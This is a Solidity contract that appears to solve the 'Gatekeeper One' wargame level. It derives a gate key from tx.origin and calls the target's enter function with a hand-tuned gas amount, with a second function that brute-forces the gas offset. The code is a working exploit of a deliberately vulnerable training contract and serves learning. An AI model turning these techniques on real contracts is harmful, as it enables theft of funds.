```solidity
// SPDX-License-Identifier: MIT

pragma solidity >0.8.0;

contract GatekeeperOneSolution {
    address gkAddress;

    constructor(address _address) {
        gkAddress = _address;
    }

    /**
     * Option1:
     * =======
     * Using the magic number to offset the "gasleft():
     * 1) Either by debugging with Remix
     * 2) Or by brute-force.
     */
    function pass() external {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        (bool success, ) = gkAddress.call{gas: 8191 * 4 + 256}(
            abi.encodeWithSignature("enter(bytes8)", gateKey)
        );
        if (!success) {
            revert("Karamba");
        }
    }

    /**
     * Option2:
     * =======
     * Alternatively we can use the brute-force solution.
     * Note that gas costs can change so the loop iterations may need to be increased.
     */
    function passBruteForce() external returns (uint16){
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        bool success;
        for (uint16 i = 0; i < 500; i++) {
            (success, ) = gkAddress.call{gas: 8191 * 3 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                return i;
            }
        }
        revert("Karamba");
    }
}
```
